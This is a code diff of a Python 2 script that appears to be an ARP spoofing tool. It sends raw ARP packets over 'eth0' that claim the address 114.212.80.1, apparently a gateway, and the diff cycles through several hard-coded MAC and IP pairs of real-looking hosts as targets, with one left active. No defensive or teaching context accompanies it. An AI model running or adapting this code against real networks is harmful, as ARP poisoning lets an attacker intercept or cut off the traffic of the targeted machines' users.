@@ -5,8 +5,24 @@ import socket
 import string
 
 
-#ETH_TARGET = '00:e0:4c:53:44:58'
-ETH_TARGET = '\x00\xe0\x4c\x53\x44\x58'
+#ETH_TARGET = '\x00\xe0\x4c\x53\x44\x58'
+#another_IP = "114.212.87.245"
+
+#ETH_TARGET = '\x00\x23\x9c\xde\xd5\x28'
+#another_IP = "114.212.86.125"
+
+#ETH_TARGET = '\x00\x23\x9c\xde\xd5\x28'
+#another_IP = "114.212.86.120"
+
+#ETH_TARGET = '\x50\xe5\x49\x47\x1a\x8c'
+#another_IP = "114.212.86.146"
+
+#ETH_TARGET = '\x90\x2b\x34\x5d\xa7\xe3'
+#another_IP = "114.212.83.200"
+
+ETH_TARGET = '\x50\xe5\x49\x47\x1a\x8c'
+another_IP = "114.212.87.146"
+
 ETH_TYPE_ARP= 0x0806
 
 
@@ -15,10 +31,8 @@ def send_arp( ifname , address ):
 	try:
 		eth_socket =  socket.socket( socket.AF_PACKET , socket.SOCK_RAW) ;
 		eth_socket.bind( (ifname , ETH_TYPE_ARP) ) ;
-		print eth_socket.getsockname() ;
+#		print eth_socket.getsockname() ;
 		eth_addr = eth_socket.getsockname()[4] ;
-		print len(eth_addr)
-		print len(ETH_TARGET )
 		
 	except socket.error, (errno , msg ) :
 		if errno == 1 :
@@ -60,7 +74,6 @@ def send_arp( ifname , address ):
 
 
 false_IP = '114.212.80.1'
-another_IP = "114.212.87.245"
 
 if __name__ == '__main__':
 	send_arp( 'eth0' , false_IP );
